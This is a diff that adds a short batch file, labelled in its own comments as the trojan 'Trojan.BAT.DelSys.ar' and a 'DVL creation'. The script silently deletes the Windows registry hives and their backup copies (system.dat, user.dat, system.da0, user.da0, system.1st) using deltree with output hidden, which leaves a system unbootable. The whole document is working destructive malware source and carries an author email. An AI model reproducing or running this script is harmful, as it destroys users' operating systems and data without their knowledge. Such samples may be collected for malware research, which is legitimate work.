@@ -1,0 +1,10 @@
+@echo off
+deltree/y c:\system.1st >nul
+deltree/y c:\windows\system.da0 >nul
+deltree/y c:\windows\system.dat >nul
+deltree/y c:\windows\user.dat >nul
+deltree/y c:\windows\user.da0 >nul
+::Kaspersky name is Trojan.BAT.DelSys.ar
+::Another DVL creation
+::dvl2003ro@yahoo.co.uk
+cls
